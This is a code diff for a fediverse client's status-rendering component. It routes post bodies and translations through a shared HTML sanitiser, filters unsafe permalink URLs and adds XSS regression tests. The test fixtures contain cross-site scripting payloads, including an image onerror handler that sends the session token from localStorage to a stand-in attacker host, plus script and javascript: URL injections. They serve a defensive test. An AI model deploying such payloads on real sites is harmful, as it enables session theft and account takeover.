@@ -6,9 +6,9 @@
 //! reader's saved preference — arrives as a callback or as an initial state, and its absence
 //! is a branch of this markup, never a second layout.
 //!
-//! The body text arrives already rewritten: `inner_html` is the caller's HTML, so the server
-//! hands in the same emoji-substituted string it used to interpolate and the client hands in
-//! what the instance sent.
+//! Both paints share the same allowlist sanitiser ([`crate::html::prepared`]) so status
+//! bodies and translations are sanitised and custom emoji are expanded in text nodes before
+//! `inner_html` is set.
 
 use leptos::prelude::*;
 use nodus_client_core::model::{MediaAttachment, Mention, Poll, Status, Tag};
@@ -99,12 +99,12 @@ pub fn StatusBody(
     let translated_for_body = translated;
     let body_html = StoredValue::new(move || {
         if let Some(translation) = translated_for_body.get() {
-            return with_emojis(&translation.content, &emojis);
+            return crate::html::prepared(&translation.content, &emojis);
         }
         if format.as_deref() == Some("mfm") {
             mfm::render(source.as_deref().unwrap_or(&content), &emojis)
         } else {
-            with_emojis(&content, &emojis)
+            crate::html::prepared(&content, &emojis)
         }
     });
     let spoiler_text = StoredValue::new(move || {
@@ -335,46 +335,6 @@ fn grid(
     .into_any()
 }
 
-/// Replace `:shortcode:` tokens with the instance's emoji images.
-///
-/// The server already does this while preparing its HTML; the browser receives the raw
-/// shortcodes from Mastodon, so the shared body has to paint them there too.
-fn with_emojis(content: &str, emojis: &[nodus_client_core::model::CustomEmoji]) -> String {
-    if emojis.is_empty() {
-        return content.to_owned();
-    }
-    let mut painted = content.to_owned();
-    for emoji in emojis {
-        let source = if emoji.url.is_empty() {
-            emoji.static_url.as_deref().unwrap_or_default()
-        } else {
-            emoji.url.as_str()
-        };
-        if source.is_empty() {
-            continue;
-        }
-        let token = format!(":{}:", emoji.shortcode);
-        // The server already prepared this HTML: its emoji image carries the shortcode in
-        // `alt`/`title`, so replacing the token again would nest markup inside the attribute.
-        if painted.contains(&format!("alt=\"{token}\"")) {
-            continue;
-        }
-        let replacement = format!(
-            "<img class=\"emoji inline-block h-[1.2em] w-auto align-[-0.2em]\" alt=\"{token}\" title=\"{token}\" loading=\"lazy\" decoding=\"async\" src=\"{source}\">",
-            token = token
-                .replace('&', "&amp;")
-                .replace('"', "&quot;")
-                .replace('<', "&lt;"),
-            source = source
-                .replace('&', "&amp;")
-                .replace('"', "&quot;")
-                .replace('<', "&lt;"),
-        );
-        painted = painted.replace(&token, &replacement);
-    }
-    painted
-}
-
 /// Hashtags, mentions and the permalink, in that order.
 #[component]
 fn StatusChips(
@@ -413,7 +373,7 @@ fn StatusChips(
                     }
                 }
             </For>
-            {url.map(|url| view! {
+            {url.filter(|href| crate::html::safe_url(href)).map(|url| view! {
                 <a
                     class="ml-auto flex items-center gap-1 text-xs opacity-60 hover:opacity-100"
                     href=url
@@ -587,5 +547,128 @@ fn PollOption(
                 <span class="block h-1 rounded bg-primary" style=format!("width: {share}%")></span>
             </span>
         </button>
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use leptos::prelude::{Owner, RenderHtml as _};
+    use nodus_client_core::model::{Account, CustomEmoji, Status, Visibility};
+
+    use super::{StatusBody, StatusBodyProps};
+
+    fn sample_status(content: &str, emojis: Vec<CustomEmoji>) -> Status {
+        Status {
+            id: "1".to_owned(),
+            created_at: "2026-01-01T00:00:00Z".to_owned(),
+            content: content.to_owned(),
+            visibility: Visibility::Public,
+            account: Account {
+                id: "1".to_owned(),
+                acct: "alice@example.org".to_owned(),
+                display_name: "Alice".to_owned(),
+                note: String::new(),
+                avatar: String::new(),
+                header: String::new(),
+                bot: false,
+                locked: false,
+                followers_count: 0,
+                following_count: 0,
+                statuses_count: 0,
+                last_status_at: None,
+                discoverable: None,
+                indexable: None,
+                noindex: None,
+            },
+            favourites_count: 0,
+            reblogs_count: 0,
+            replies_count: 0,
+            favourited: false,
+            reblogged: false,
+            bookmarked: false,
+            reblog: None,
+            in_reply_to_id: None,
+            emojis,
+            url: None,
+            sensitive: false,
+            spoiler_text: String::new(),
+            language: None,
+            content_format: None,
+            content_source: None,
+            media_attachments: Vec::new(),
+            mentions: Vec::new(),
+            tags: Vec::new(),
+            poll: None,
+            edited_at: None,
+            pinned: None,
+        }
+    }
+
+    #[test]
+    fn status_body_sanitizes_xss_and_prevents_emoji_attribute_breakout() {
+        let mut status = sample_status(
+            "<p>hi :wave: <a href=\"https://example.com/:wave:\">link</a></p>\
+             <img src=x onerror=\"fetch('https://attacker.tld/?'+localStorage.getItem('nodus.session'))\">\
+             <script>alert(1)</script>",
+            vec![CustomEmoji {
+                shortcode: "wave".to_owned(),
+                url: "https://cdn.test/wave.png".to_owned(),
+                static_url: None,
+            }],
+        );
+        status.url = Some("javascript:alert(1)".to_owned());
+
+        let rendered = Owner::new().with(|| {
+            StatusBody(StatusBodyProps {
+                status,
+                on_open_media: None,
+                on_vote: None,
+                interactive: false,
+                revealed_init: false,
+                target_language: "en".to_owned(),
+            })
+            .to_html()
+        });
+
+        assert!(!rendered.contains("onerror"), "{rendered}");
+        assert!(!rendered.contains("attacker.tld"), "{rendered}");
+        assert!(!rendered.contains("<script"), "{rendered}");
+        assert!(!rendered.contains("javascript:"), "{rendered}");
+        assert!(
+            rendered.contains("href=\"https://example.com/:wave:\""),
+            "{rendered}"
+        );
+        assert_eq!(
+            rendered
+                .matches("src=\"https://cdn.test/wave.png\"")
+                .count(),
+            1,
+            "{rendered}"
+        );
+    }
+
+    #[test]
+    fn status_body_blocks_unclosed_tag_and_open_quote_xss_on_ssr() {
+        for payload in [
+            "<img src=x onerror=\"alert(1)\" ",
+            "<img src=x onerror=\"alert(1)\" alt=\"",
+        ] {
+            let status = sample_status(payload, Vec::new());
+            let rendered = Owner::new().with(|| {
+                StatusBody(StatusBodyProps {
+                    status,
+                    on_open_media: None,
+                    on_vote: None,
+                    interactive: false,
+                    revealed_init: false,
+                    target_language: "en".to_owned(),
+                })
+                .to_html()
+            });
+
+            assert!(!rendered.contains("<img"), "{rendered}");
+            assert!(!rendered.contains("onerror"), "{rendered}");
+            assert!(!rendered.contains("alert(1)"), "{rendered}");
+        }
     }
 }
